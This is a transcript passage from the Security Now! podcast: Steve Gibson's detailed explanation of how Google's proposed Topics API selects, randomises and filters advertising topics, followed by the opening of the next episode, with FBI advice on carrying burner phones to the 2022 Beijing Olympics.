Now, when I say "reasonable complaint," I'm intending to acknowledge that there are some entities, like the EFF, for whom nothing short of absolute and total anonymity will ever be acceptable.  The EFF is not only anti-tracking, they are also anti-ad targeting.  They object to any website having any a priori information about its visitors.  As such, they stand in opposition to precisely what it is that Google is attempting and hoping to achieve, which is a reasonable compromise, is a way to  target ads with zero tracking.  So I think, I hope we can get there because that's where we should be.  If we're going to have ads, they might as well be targeted, especially if the targeting is transparent and open and accessible and doesn't have a privacy downside.  Again, nothing will make the EFF happy.  Fine.  So we're not going to try.



Okay.  So the as yet unanswered question is are we going to eventually interact with a world on the web which more resembles the world off the web, where everyone driving on the freeway sees the same billboard signs, and everyone walking through a shopping mall encounters the same offers?  Or are the unique web technologies which allow our individual interests to be determined going to be used to present us with customized content?  And the point is everybody wins if we can do that without compromising privacy.



Anyway, EFF, sorry, you're going to lose this one.  Today we're going to examine the operation of Google's next proposal, the Topics API.  And as I said, whereas FLoC was largely opaque and incomprehensible, Google apparently learned that lesson well, since transparency and understandability are Topics' primary features.  Now, there is, and the reason we're talking about it, it's more than just, oh, yeah, some topics.  There's a lot going on under the hood worthy of this being the subject of this podcast.



So we should start by reminding everyone that Google has an initiative for Chrome which they call the "Privacy Sandbox."  Its headline slogan is "Building a more private, open web," and its headline reads: "The Privacy Sandbox initiative aims to create web technologies that both protect people's privacy online and give companies and developers the tools to build thriving digital businesses to keep the web open and accessible to everyone."  So, yes, having it both ways.  And yeah, it's profitable to advertisers.  It's also profitable to people who host those ads.  And those are the people we want to support.



We all know that Google has a vested interest in somehow maintaining advertising relevance.  That's not in question.  But they are also running what is, by far, the most popular web browser in the world.  Even mighty Microsoft capitulated and adopted Google's Chromium core.  So the fact that they're interested in using the power of their browser to completely thwart and kill actual tracking  which I think is a far more pernicious threat than ad targeting  is significant.



Their Privacy Sandbox initiative has the following three goals, which it states:  "Prevent tracking as you browse the web."  They said:  "People should be able to browse the web without worrying about what personal information is being collected and by whom.  The Privacy Sandbox initiative [Google's Privacy Sandbox initiative] aims to remove commonly used tracking mechanisms, like third-party cookies, and block covert techniques, such as fingerprinting."  And they're serious about this.  But they've got to be able to still do targeting.



Two:  "Enable publishers to build sustainable sites that respect your privacy."  And they said of that:  "Website developers and businesses should be able to make money from their sites and reach their customers without relying on intrusive tracking across the web.  The Privacy Sandbox initiative is developing innovative, privacy-centric alternatives for key online business needs, including serving relevant ads."  And three:  "Preserve the vitality of the open web."  They said:  "The open web is a valuable resource of information, with a unique ability to both share content with billions of people and tailor content to individual needs.  The Privacy Sandbox proposals aim to both protect your safety online and maintain free access to information for everyone, so that the web can continue to support economic growth, now and for the future."



Okay.  So a first broad overview of the concept behind the new Topics API proposal.  Then we're going to get down to the details, and there are many.  The Product Director of the Privacy Sandbox for Chrome explains their goals for Topics, as follows.  He said:  "We started the Privacy Sandbox initiative to improve web privacy for users, while also giving publishers, creators, and other developers the tools they need to build thriving businesses, ensure a safe and healthy web for all.  We also know that advertising is critical for many businesses and is a key way to support access to free content online.  Today we're announcing Topics, a new Privacy Sandbox proposal for interest-based advertising.  Topics was informed by our learning and widespread community feedback from our earlier FLoC trials, and replaces our FLoC proposal."  Yes, it's well dead.



He said:  "With Topics, your browser determines a handful of topics, like 'Fitness' or 'Travel & Transportation,' that represent your top interests for that week based on your browsing history.  Topics are kept for only three weeks, and old topics are deleted.  Topics are selected entirely on your device without involving any external servers, including Google servers.  When you visit a participating site, Topics picks just three topics, one topic from each of the past three weeks."  And I'm going to get into all of the mechanisms of this because they're complex.  But the concept is simple.  Topics picks just three topics, one topic from each of the past three weeks, to share with the site and its advertising partners, with ads that appear there.



"Topics enables browsers to give you meaningful transparency and control over this data.  And in Chrome, we're building user controls that let you see the topics, remove any you don't like, or disable the feature completely.  More importantly, topics are thoughtfully curated to exclude sensitive categories, such as gender or race.  Because Topics is powered by the browser, it provides you with a more recognizable way to see and control how your data is shared, compared to tracking mechanisms like third-party cookies.  And by providing websites with your topics of interest, online businesses have an option that doesn't involve covert tracking techniques like browser fingerprinting in order to continue serving relevant ads."



Okay.  So the overall concept is simple.  The browser notices the websites being visited by their domain name and looks up a set of topics from a curated list of available topics.  That list currently contains 350 items.  And we should put up on the screen - and Jason, you should take a look at it.  I've got a link right here in the show notes at the top of the page.  Oh, actually it's also GRC's shortcut of the week so that everyone listening live and who has a computer when they're listening to this can pull it up:  grc.sc/856, today's episode number; grc.sc, for shortcut, /856.  That will bounce you over to GitHub.com, where the so-called "taxonomy" of the Topics v1 is listed.  And anyone can see as they scroll through this that, I mean, it is absolutely benign.  I mean, it's boring.



And as I was looking through it, I'm thinking, I hope this is enough for advertisers, you know, because it's got like an Arts & Entertainment kind of a broad topic.  Then it's got subtopics of arts and entertainment, acting and theater, arts and entertainment.  It's got comics, concerts, and music festivals; dance, entertainment industry, humor.  Then under humor is live comedy.  We have live sporting events.  We've got arts and entertainment.  We've got magic.  Movie listings and theaters, I mean, it's like that.  And Arts & Entertainment is like, looks like about a quarter of them all are under A&E.



JASON:  Yeah, right.



STEVE:  And then finally we're done with that.  We've got autos.  We've got autos and vehicles.  Cargo trucks and trailers.  Classic vehicles.  Performance vehicles.  I mean, boring.  We've got coupes, convertibles, hatchbacks, luxury vehicles.  But, I mean, nothing that anybody could be upset about.  You might be annoyed if it gets it wrong, like wait a minute, I want high performance, not sedans.  Business and industrial.  Computers and electronics.  Finance.  We've got a bunch of those.  Food and drink.  Games.  We've got some games.  And hobbies.



JASON:  Games, hobbies, home and garden.  Logan5 in the IRC pointed out this really sounds like the hierarchy of old newsgroups.  And I have to agree.  This is like a newsgroup list.



STEVE:  That's a very good point, yeah.



JASON:  A really good point.



STEVE:  Yeah.  And so, I mean, it's just it's boring.  So have at it, Google.  Okay.  So but the way this works is very cool.  And our techie listeners are going to love this.  The browser calculates the top topics for its user, that is, its browser, its user, based upon their recent browsing activity, just where they go, and it provides a JavaScript - it exposes a JavaScript  API that provides topics currently of interest to the user, to help enable the selection of appropriate ads.  Okay.  But there's a lot to it.



The intent of the Topics API is to provide the users of the API, that is, ads or the site you're visiting, with coarse-grained - and as we've seen they really are - and privacy-enhanced, not very specific advertising topics that the page visitor, that the person visiting the site might currently be interested in.  And of course the site knows what kind of stuff it's about.  Is it wedding planning or travel planning?  So there is the context of where you are that also matters.  And advertisers also know what kind of site they're advertising on.  So the topics API supplements the information of just what kind of site you're on.



And as I said, Google calls this list their advertising taxonomy.  And right now it's 350 items.  It will be curated.  They're hoping to give it to some third party so they don't own it, but it's done by the industry.  There's nothing that fixes it at 350.  The idea is it's from a few hundred to a few thousand, whatever the ad industry decides they need.  But this gives you a sense.  The one we have now with 350 items gives you a sense for the way it's going to look.  There is a web domain classifier which is what figures out the domain where you are and what topic or topics, one or more, are relevant to the site you're visiting.



For any given domain web classifier, like when you're visiting a specific site, it might return no topics.  There just might not be anything it knows about the site.  It could return one or several.  There's no limit, though their expectation is somewhere between one to three because, you know, you could have a site that's kind of about two different things; right?  So it's possible that a site may map to no topics, in which case it would not add to the user's topic history as they're browsing around, which the browser is accumulating as it collects the topics that are connected to the sites they visit.



In the past we've talked about the DOM, the standardized Document Object Model.  One of the objects that's always present in this model is the "document" object.  The document object has a bunch of properties like "body," which is the document's body text, and "images," which is a collection of all the images present in a document, and "links," which is a collection of all of the links present in a document.  The Topics API adds the new "browsingTopics" property to every page's document object.  And that of course makes it available to JavaScript running on the site or running in the site's ads, which are able to query the document "browsingTopics" property.



That property provides anyone who asks with up to three topics from the 350-item taxonomy, one from each of the preceding three weeks, not actually even the week you're in now.  That's in the process of acquiring topicness, you know, topic knowledge about what you're doing this week.  It's the preceding three weeks.  So one topic from each of the preceding three weeks.  And those three topics are returned in deliberately randomized order.  So no particular order.  But the entity that gets them will know, okay, we don't know which one is the most recent, but these represent three-week snapshots in no order of the interests that the user using this browser had based on where they went during the last three weeks.  Actually the previous three weeks.



It was decided to provide three topics so that a site or an advertiser which doesn't see visitors often, that is, specific visitors often will still be able to obtain sufficient information during one visit about the user to choose hopefully something useful to show them.  And the granularity of one week between updates - because again I hope I made it clear that at the end of the week the topics are chosen, and they are fixed for the next week.  That is, it's not a minute-by-minute or hour-by-hour or daily thing.  It is a week at a time.  So the idea is the granularity of one week, these one-week epochs are chosen so that sites you do visit often don't get a chance to learn a lot about you.  For the whole week that you're visiting often, you're always going to be showing them the same set of three topics.



And what's more, not all sites see the same weekly topic from any given user.  Here's how that works.  For each week, the user's top five topics, which are determined by the browser, obtained from the domains they visited during the preceding week, those top five topics are determined by the browser locally watching where you take it.  At no time does the user's browser contact any external servers for help with choosing.  And I mention this later, but I'll also say that the where you go is only as a result of direct user actions.  Redirects will not have any effect on the topic collection which occurs during this week.  You have to click something to go there.  So if anything tries to play games by bouncing you around, the Topics API ignores that.



Okay.  So five master topics are chosen from this list of 350 from an examination of the preceding week's total browser history of user-created events.  And one additional topic is chosen completely at random from the current taxonomy.



Okay.  Then, when this "document.browsingTopics" API is called by a site which the user is visiting, or JavaScript running in one of its ads, the topic returned for each of the three weeks - and remember, returned in random order - is chosen from those original six available topics as follows:  With a 5% chance, so one in 20, that randomly chosen topic will be returned.  Just whatever.  You know, randomly chosen.  Otherwise, the other 95% of the time, the value of an HMAC, a cryptographic hash, is computed from a static per-user private key that has just the purpose of personalizing and customizing this, the week number, like from 1970 or whatever, the number of the week we're in, and the document page's website domain name.  Okay?



So a hash is computed from a secret which I'm sure Chrome makes up once and just stores in itself, it's a per-user private key, and that means that not everybody is going to be generating the same hash value, everyone in fact will be generating a different one; the week number; and the document page's website domain.  They're all hashed together to create the digest.  That is then taken modulo 5 to produce a uniformly distributed value between 0 and 4.  That 0 to 4, 01234, so five values, is used to choose one of the user's top sites for that week.



Okay.  So let's stop for a minute.  What that means is that, and it may seem overly complicated, but it's clever and privacy enforcing.  The use of an HMAC keyed by a per-user secret, the week number, and the domain of the webpage means that, for that week, the user's browser will always present the same one of those five topics, 95% of the time, to anyone querying at the same site, but the other 5% of the time you get the random one.  But that every site you visit that queries you will see an unpredictable but constant one of those five topics for that user for the week.



So that of course helps to break any kind of cross-domain trackability.  It minimizes the amount of information being disclosed, since no site will receive more than one fixed topic, as I said, per week.  And each site gets only one of the five real topics to make it much more difficult to cross-correlate the same user.  And Google introduces that 5% noise to ensure that each topic has a minimum number of members, that is, some presence of every topic, as well as to provide some amount of plausible deniability, meaning that no topic can be regarded as being absolute.  It may have been the one that was deliberately chosen at random.  No one can say.



And finally, the point in time where a user's week ends and the next one begins is not Sunday at midnight or something.  It is completely chosen for the user and their browser to be any point in time.  So that also introduces some additional uncertainty and noise since not everyone's web browser will be calculating new topics and updating their weekly topic batch at the same time and on the same day.



And one last very tricky and important bit.  And this one, ooh, I had to read this, like, many times and actually create some examples to understand it.  In fact, Google provides some because they know.  Good luck.  Okay.  This one's very tricky, a bit of a mind bender.  But it's an important privacy safeguard for the entire system.  It addresses the problem that FLoC had and which Leo mentioned several times on other TWiT podcasts.  The problem was that FLoC was broadcasting a token which was a condensation of the person's web browsing history.  And besides being opaque and mysterious, it was thus by extension a condensation of them.  And those who knew how to interpret the token would know what it meant.



And this token was being presented to any website they visited without prompting.  This was correctly seen as delivering a significant reduction in user privacy.  You know, the site - and I remember Leo talking about it.  The site had no chance, didn't need to get to know you when you visited.  You just had this beacon that was saying blah, you know, and nobody knew what that meant.  But it was just this gibberish that meant something to somebody who knew, who had a pervasive enough look across the web to know how to interpret that token.



And the problem, fortunately, did not fall upon deaf ears at Google.  Google has clearly given this a great deal of thought.  And as I said, it bears no resemblance to what we had before.  The Topics API incorporates a mitigation for this problem.  Okay.  And I have in my notes here that I should mention that there's nothing whatsoever salacious or even really very interesting about the list of topics.  They are boring.  But they do make sense from an advertiser's standpoint.  So the first point is that there's just no way for anything very personal to be revealed or represented by these topics, as we said.  And I hope everybody will take a look at grc.sc/856 to get a sense for it.



Okay.  But even so, the Topics system contains a strong topics filter.  Here's how it works.  Not every caller of this API, that is, when you visit a site, and the site queries the API, the site or its advertisers, not every caller of this API will receive all of a user's three chosen browser topics.  Only callers to the API that observed the user's browser visiting some site which mapped to the topic in question within the prior three weeks qualifies to see that topic.



Okay.  In other words, and we're going to go over this a few times, in other words, if the user of the API  website or advertiser on a site  did not call the API sometime in the past three weeks, that is, the prior three weeks for which those topics are relevant for that user's browser when they were visiting a site which mapped to the topic in question, then the topic will be filtered and not included in the three-topic array returned by the API.



Okay.  In other words, the advertiser has to have had contact with the user's browser at a site whose topic is the one that would be returned in order for them to get it again.  So, I mean, it is a tight filter.



Okay.  So let's use an example.  During the previous couple of weeks, a user's been browsing a lot about travel.  So for the time being the browser has learned about them and chosen to represent their travel-related interest to the world as they visit other sites.  And remember, all of this is a moving three-week window; right?  So what you were doing last week then moves to two weeks ago, then moves to three weeks ago, and then is discarded forever.  So there is this notion of recency of what you're doing.  Okay.  So because you've been visiting lots of travel-related sites the browser has learned that about you.  And so when your week ends, you become for the most recent week ended, related to travel.  



So now suppose that they're at a site about gaming, and an advertiser on that site runs JavaScript in an ad insertion frame which queries the document.browsingTopics API to receive the three topics of interest to the user - again, no particular order - which the user's browser has chosen to offer anyone querying its user while on this gaming site.  And remember, thanks to that HMAC hash, different sites receive different one of the top five interests which were accumulated during that previous week.  Only if that advertiser had queried that user's document.browsingTopics API sometime within the previous three weeks, while that browser was at some site whose topics matched the topic the user's browser had chosen to offer at this site now, would that topic not be filtered, and thus be presented to the advertiser.



In other words, in order to obtain an interest topic from a user when they are wandering around anywhere on the Internet, an advertiser must have previously asked their browser about them during the past three weeks while they were on a site whose topics may have contributed to the topic they are offering this week.  So it doesn't have to be the same site.  It's just another site with the same topic that the browser wants to provide the API querier this week.



So in this world, assuming that we've blocked - that is, in this world, imagine a world where Topics API is paramount and wins.  Where we've blocked third-party cookies, we've blocked fingerprinting and all other tracking, and perhaps even outlawed it, which admittedly may be what it takes to actually get rid of it, the advertiser doesn't know who the user is at all.  But they will have recently pinged the user's browser while the user was at a website whose topics matched the topic the user is now offering.



Google explains that this extra topic information filtering is intended to - and I love this - intended to "prevent the direct dissemination of user information to more parties than the technology the API is replacing."  Again, this is intended to "prevent the direct dissemination of user information to more parties than the technology that the API is replacing."  In other words, third-party cookies.  Another way of phrasing it is that this ensures that third parties don't learn more about a user's past than they could with a cookie.



And when you think about it, that's exactly what it does.  It does that.  As I started out saying, it prevents the problem that FLoC presented of simply blabbing about a user's previous web history via the weird hash token that FloC was using.  The history window which limits the inclusion of topics available to each caller, as I said, is three weeks.  After that, nothing you were doing older than three weeks ago has any chance of appearing.  It should be obvious, but only topics of sites that use the API, or host ads that query the API, will contribute to the weekly calculation of topics.



Actually, that's not so obvious.  And that's important.  If you are visiting sites, and the browser isn't asked about the topic, that site's history is not accrued.  That's critical because it's a simple way for sites not to participate in any of this if they for whatever reason choose not to.  They are able to put a header in to block this completely, a metatag header or a query response header.  But again, only when a site, only when your browser is queried about topics does that site's topics get added to your history.



Let's see.  What else?  The goal of the Topics API is to take a step forward toward increased user privacy, while still providing enough relevant information to advertisers that websites can continue to thrive, but without the need for invasive tracking enabled via existing tracking methods.  And the user has control.  That's another important aspect of this.  Google understands that their users should be able to understand 



the purpose of the Topics API, recognize and view what information is being provided about them, know when the API is in use, and be provided with controls to enable, disable, or edit it.



The API's human-readable taxonomy enables people to learn about and control the topics that may be suggested about them by their browser.  Users can remove topics they specifically do not want the Topics API to share with advertisers or publishers for whatever reason, although as I said they seem really pretty generic, and there can be user experience for informing the user about the API and how to enable or disable it.  Chrome would provide information and settings for the Topics API at chrome://settings/privacySandbox.  In addition, topics are not available to API callers in Incognito mode.  Nothing happens there.  And topics are cleared when browsing history is cleared.  So clearing your browser history wipes all of this out. 



And finally, unlike FLoC, which built its hash from every site visited, only sites that include code - I'm repeating myself - which calls the Topics API would be included in the browsing history eligible for topic frequency calculations.  In other words, sites are not eligible for contributing to topic frequency calculations unless the site or an embedded service has taken the action of calling the API.  There is a Permissions-Policy header which can be sent to browsing-topics=().  And that will shut this all down.  The privacy sandbox settings allow this all to be disabled, and it's always disabled in Incognito mode.



So that's the operation of Google's newly proposed Topics API.  To me, it feels like a far more refined effort than FLoC.  Its implementation will require vastly more work from the browser end than anything before.  But that feels appropriate, too, if Google wants to hold onto advertiser buy-in while working to eliminate third-party tracking.  Having the browser do a lot more work to protect the privacy of its users makes a lot of sense.



We know the EFF would say they want nothing less than pure and absolute anonymity.  I have no way to gauge how much revenue ad sites would lose if targeted advertising were eliminated.  But we hear that it would be a significant blow.  I certainly wouldn't shed a tear over the end of any companies whose entire business model is secretly tracking users against their wishes.  To me, the Topics API feels as if Google is finally getting really serious about offering a compromise to pure tracking which advertisers can live with and which offers sufficient clarity, visibility, feedback, and control.  I like it.



If it's just added to the tracking and fingerprinting mess that we already have, then we lose.  But if its adoption allows Google to join Firefox in truly battling third-party cookies with, for example, per-site siloing and other proactive anti-tracking and anti-fingerprinting measures, that is, if Google really and finally have their hearts in it, then I think it has the potential to be a big leap forward for the industry.  And we need to have Leo listen to this because I want him to understand it, too.



JASON:  Yeah, indeed.  I mean, it's fascinating.  I definitely, the way you spelled it out, understand it better.  A couple of questions for you.  You mentioned earlier about kind of complexity of systems like this, and users just by and large, you know, don't trust something they don't understand.  Is this still too complicated for users to buy into, do you think?  Or is this different?



STEVE:  So absolutely.  What I just described, like the workings of the inner plumbing with hash functions and per-user keyed hashes, completely too complicated.



JASON:  Yeah.



STEVE:  But none of that needs to be seen.  What the user would see is this week these are the five interests, one of which will be shown to sites you visit.  The previous week, these are the five interests, one of which will be shown to the site you visit.  And for the third week, these are the five interests.  That's what the user will see.



And so it's like it's the tip of the iceberg, but it is a true tip.  I mean, it's true information.  It's just that we're not getting into the nitty-gritty crypto of how Google is choosing which one of those five for each of the three weeks to show.  And I think that's understandable.  It's like, you know, so the user gets it that no older information is being shown, only the previous week, the week before that, and the week before that.  And five topics, one of which will be chosen from each of those three bins.  I think people who are curious can understand that.  And if nothing else, they'll hear that, oh, it's good.



JASON:  Right.



STEVE:  It's private.  Some guy who listens to this weird podcast called Security Now! said it was explained to him, and he gets it, and he loves it, so I trust him.  So good.



JASON:  Yeah, yeah, right.  And then I think some naysayers, and I actually saw a little bit of this in the chat and the Discord, are saying that anything with enough work is going to give someone something deeper to find and to discover.  Do you think that's the case here?  Is it inevitable for someone who's really, truly motivated, or maybe it's a person, maybe it's an organization, to actually be able to identify individuals based on what we have here?  Do you think that's inevitable?  Or is this system pretty secure as far as that's concerned?  Or private?



STEVE:  I don't know how you - so one of the things it won't do is allow you to query it statically.  That's the cool thing.  The only way to get information is to have been querying the user everywhere they have gone for the previous three weeks in order for you to receive those interests from them.  So you can't simply say, like, sit in one place and look at the topics of people who come to you, like querying their browser.  You'll get nothing because you didn't query them when they were at a site that was generating any of those topics.  I mean, it really is clever.  It's subtle, but they really did get it right.



JASON:  Right on.  Great explainer.  I love that I was here for this, for this episode, to really get the details.  So thank you for taking the time to dive into this.  And yeah, I guess the question remains like how much is the benefit of this system communicated to the average person so that there is that that acceptance of this system compared to what we've had in the past.  And I guess ultimately that's going to drive...



STEVE:  I'll tell you my biggest worry.  My biggest worry is hoping that it is enough for advertisers.



JASON:  Right, that's true.



STEVE:  It's really not much.



JASON:  Yeah, that's a really good question; right?  Are advertisers going to be happy accepting what they have here when the systems prior gave them so much more, so much more access.



STEVE:  Well, the systems prior gave them everything.



JASON:  Yes.



STEVE:  I mean, they knew everywhere you went, what you did, who you were, your zip code, your address.  I mean, the amount of information which has been collected about us is astonishing.  And, I mean, it's a closely kept secret, too, because they know that if we knew, Congress would be acting.  So I hope this is enough because, if this is enough, sign me up.  This thing is great.



JASON:  All right.  There you go.  There you have it.  Explainer-in-Chief gives it a thumbs up.  I love it.  Thank you so much, Steve.  It's always a true honor and privilege for me to get to do this show with you when Leo is out.  We didn't even mention Leo's out enjoying himself in Carmel right now.  So wishing him a fun week of relaxation and everything.



In the meantime, if you all want to check out everything that Steve does, all you have to go to is GRC.com.  Everything you need to find is there.  SpinRite, of course, that Steve spoke about earlier, the best mass storage recovery and maintenance tool.  You can get your copy there.  Yes, information about SQRL, and information about this show.  Steve actually posts audio of the show, transcripts as well.  Is that the only place that the transcripts can be found?  I can't remember if we even put it on our site.



STEVE:  Yeah, I think they're only here, yeah.



JASON:  Awesome.  GRC.com.  If you want to check out this show here at TWiT, of course it's TWiT.tv/sn.  You can find the audio and video formats there, as well.  All the podcatchers that you use, everything's linkable.  YouTube, everything can be found there.



We record this show live, Security Now! live every Tuesday at 4:30 p.m. Eastern, 1:30 p.m. Pacific, 21:30 UTC currently.  And of course that's usually with Leo sitting in with Steve.  But thank you, Steve.  Really appreciate getting to sit in with you today.



STEVE:  Jason, an absolute pleasure.  Talk to you next time.  



JASON:  All right.  We'll see you next time on Security Now!.  Bye, everybody.



STEVE:  Bye.



Copyright (c) 2022 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.






GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#857

DATE:		February 8, 2022

TITLE:		The Inept Panda

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-857.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we're going to take a look at our law enforcement and cyber defense recommendations regarding safe conduct while in Beijing for the 2022 Winter Olympic Games.  We're going to take a look at a serious CVSS 9.9 vulnerability affecting Linux's use of SAMBA, and at some interesting details of so-called "Living Off the Land" exploitation of commonly present operating system utilities.  We'll examine Microsoft's most recent approach to application packaging and installation triggered by their recent wholesale neutering of its primary application and feature.  And we're also going to celebrate a welcome change in Microsoft policy that's been 20 years in the making.  I'll share a brief pre-announcement of a new forthcoming GRC quickie freeware utility.  Then we'll take a close look at "MY2022," the iOS and Android application which all attendees of the Beijing Olympics are required to install, carry, and use.  Citizen Lab's reverse-engineering analysis will explain how this week's podcast got its name.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson's here.  Yes, I'm back.  Thank you, Jason, for filling in last week.  We've got lots to talk about.  A vulnerability with Linux's SAMBA that everybody's going to want to fix.  It's a 9.9 on the Richter scale.  We'll talk about living off the land, a way of exploiting commonly present operating system utilities.  There's quite a long list.  You might be curious to find out what that is.  And then Steve's going to take a look at the application required of all Olympians, MY2022.  Turns out it's a nightmare of security flaws.  All coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 857, recorded Tuesday, February 8th, 2022:  The Inept Panda.



It's time for Security Now!, the show where we cover the latest security news with Mr. Steve Gibson.  He explains it all to us.  Hello, Steve.



STEVE GIBSON:  You are back.  



LEO:  I am back.



STEVE:  From a week off, and Jason and I...



LEO:  Well, it was really only two days off.  It just happened to hit on Tuesday and Wednesday.



STEVE:  Oh.



LEO:  But Jason, thank you for filling in, Jason Howell.  I appreciate it.



STEVE:  Yup.



LEO:  And I hear I missed some important stuff.  It's why you've got to listen to every show.



STEVE:  Well, maybe.  As I was saying before, you did, you were on vacation when Tom and I did the what has become a significant podcast to explain from just soup to nuts how the bitcoin blockchain works.  And so that turned out to be an important one to have seen.  This one, last week's episode with Jason, explaining how Google's Topics functions, we can wait to see if it ends up getting any traction.  If not, well, it was an interesting podcast.



LEO:  Yeah.  We'd talked about FLoC, and that didn't end up being the system.  So, yeah.



STEVE:  Exactly.



LEO:  They're just throwing stuff against the wall at this point.



STEVE:  So, yeah.  This one, I mean, this is really different.  This looks like they're seeing all the back pressure which is mounting against tracking.  And they're saying, okay, you know,  we're going to have to get on the anti-tracking bandwagon, period.  It's going to have to happen.  So they've got a really nice proposal which demonstrates they were listening to everything everyone was saying about FLoC and taking it seriously.  So anyway, we'll see.



LEO:  But what is on the agenda?  Because I am here, so now you can talk about the good stuff.



STEVE:  Ah.  Glad to have you.  You're right.  This is Episode 857 for Patch Tuesday of February, that is, the 8th.  So we'll be talking about its aftermath next week.  This week we're going to take a look at law enforcement and cyber defense recommendations regarding safe conduct in Beijing for the 2022 Olympic Winter Games.  We're going to take a look.  And they had some interesting things to say.  I mean, nothing shocking, but still.  It's interesting, sort of like what's begun to emerge around the Olympics every year.  We're going to take a look at a serious CVSS rated 9.9 vulnerability, affecting Linux's use of SAMBA.  And at some interesting details of so-called "living off the land" exploitation of commonly present operating system utilities.



We'll examine Microsoft's most recent approach to application packaging.  Well, which was triggered by their recent wholesale neutering of its primary feature.  Whoops.  And we're also going to celebrate a welcome change in Microsoft's policy, a significant policy which has been 20 years coming.  I'm going to share a brief preannouncement of a new forthcoming GRC quickie freeware utility.  I think everyone's going to get a kick out of it.  I'm sure I'll be finished with it.  I already released it for testing after less than a day.  But it's something that I've become convinced that ought to be done.  And then we're going to wrap up with the title of the podcast, "The Inept Panda," taking a close look at what's called "MY2022."  That's the iOS and Android application which all attendees of the Beijing Olympics...



LEO:  Oh, yeah.



STEVE:  ...are required to install, carry, and use.  Citizen Lab reverse-engineered the app.



LEO:  Oh, dear.  Oh, dear.



STEVE:  And we will be looking then at how the podcast got its name today, "The Inept Panda."



LEO:  Oh, boy.  I can't wait.  I can't wait.  That's going to be very, very interesting.  All right.  Picture of the Week time.



STEVE:  So this is one that's a little difficult to describe.  It's so wonderful that I would commend our listeners to grab the first page of the show notes just to take a look at it.  So it came as is.  I didn't add the headline or anything.  But the headline, the title, is "1st Rule of Programming:  If it works, don't touch it!"  And what we're seeing here is like a drainpipe coming down off of the side of a building.  And I'm a little curious about how this could have ever worked because it looks like there's an elbow missing which would have converted the pipe to sort of downward, well, sort of sideways pointing out to downward to finish pouring in through the rest of the pipe.  But it doesn't look like it could have ever been quite that way.



So again, it's not clear what the history is here.  But the point is that we have a stream of water flowing out of this drain and sort of following a ballistic curve toward the ground.  Well, as a consequence of the way this drainpipe is broken, it's completely overshooting the opening that you'd like to have it going to, like completely.  Yet it is where it would be striking the pipe on the ground, where this arcing flow of water would be striking the pipe, someone, the programmer in this case, or the programmer equivalent, has chipped open the pipe so that the stream of water is perfectly going into a jagged hole in the pipe, but it's accomplishing its mission.  And...



LEO:  It sure is.



STEVE:  It works.



LEO:  It works.  Don't disconnect it.



STEVE:  So as they say, if it works, don't touch it.  First rule of programming.  It's like, is it working?  Yes.  Okay, fine.



LEO:  Yes, okay, don't touch it, anybody.



STEVE:  Okay.  So last Tuesday, upstream by a few days of the beginning of Beijing's 2022 Olympic Games, the U.S. FBI warned that visitors to this year's Olympic Games being hosted, which are being hosted in Beijing, would be well advised to leave any fancy electronics at home.  Grab an inexpensive burner, the FBI literally said, "Get a burner phone."  I'm sure they know about burner phones because the bad guys use them a lot.  In this case, we're not bad guys.  We're just people who don't want to have our high-end smartphones totally taken over.



Anyway, the FBI says "well advised to leave any fancy electronics at home.  Grab an inexpensive burner phone that could be broken into pieces once you've returned to your local airport."  In other words, the advice about traveling to China is similar to the traditional advice we've often discussed for attending the annual Black Hat and Defcon conferences in Vegas, which can be distilled to "Be afraid.  Be very afraid."



LEO:  Wow.



STEVE:  So the FBI didn't mention any specific threats.  But they didn't need to because it's become understood that malicious cyber - and I'm quoting them.  "Malicious cyber actors could use a broad range of cyber activities to disrupt these events."  There's a tremendous amount of malicious cyber activity occurring unfortunately now during the Olympics.  Recall that the Tokyo Summer Olympics was a similar mess with athletes' and attendees' personal phones being targeted, the Games' TV broadcasts were disrupted, and the personal data of volunteers and ticket purchasers for the Tokyo Olympics were leaked online.  The Olympics are high profile, and this makes everything happening there, unfortunately, a target.



After Tokyo's 2020 Summer Games, in a bit of a public relations puff piece, NTT Corporation, which was responsible for providing the cyber protection services for the Games, wrote.  They said:  "The total number of security events that were blocked during the Games, including unauthorized communications to the official website, was 450 million."  What?  Okay.  NTT added that "None were successful" - none of these 450 million attacks were successful - "due to cybersecurity measures in place."



Okay, now, who knows what they're counting as, quote, a "security event."  Maybe packets?  Because 450, really, it's not possible that there were actually 450 million separate cyber intrusions or intrusion attempts or whatever.  And we've seen this before, right, where a number is like ridiculously high because they're quoting any random packet that like was rejected by the firewall or something.  So okay.  On the other hand, no one doubts that the Games were and will be a site of intense cyber rivalry.  And it's looking like we're in for that given the early warnings that have been seen.



The FBI said that during the those Summer 2020 Games:  "While there were no major cyber disruptions, the most popular attack methods were malware, email spoofing, phishing, and the use of fake websites and streaming services designed to look like official Olympic service providers."  And actually the fact that they're talking about fake websites we'll see by the end of the podcast is significant because unfortunately visitors won't be protected from that, although they'll think they are being.  And the FBI reminded us that during the earlier 2018 Winter Olympics in South Korea, cyber actors associated with Russia were very active, and launched the Olympic Destroyer, as it was known,  attack that interfered with the Games' Opening Ceremony.  Those attacks were enabled through a spear-phishing campaign and also malicious mobile apps.  As we'll see, the mobile app in this case I think is not malicious, just very poorly written. 



Okay.  So as for taking a throwaway burner phone and leaving your personal phones and PCs at home, the FBI warned of potential threats associated with mobile apps developed by untrusted vendors.  And our CISA said that, quoted the FBI, said:  "The FBI urges all athletes to keep their personal cell phone at home and use a temporary phone while attending the events.  The download and use of applications, including those required to participate or stay in-country, could increase the opportunity for cyber actors to steal personal information, install tracking tools, malicious code, or malware."



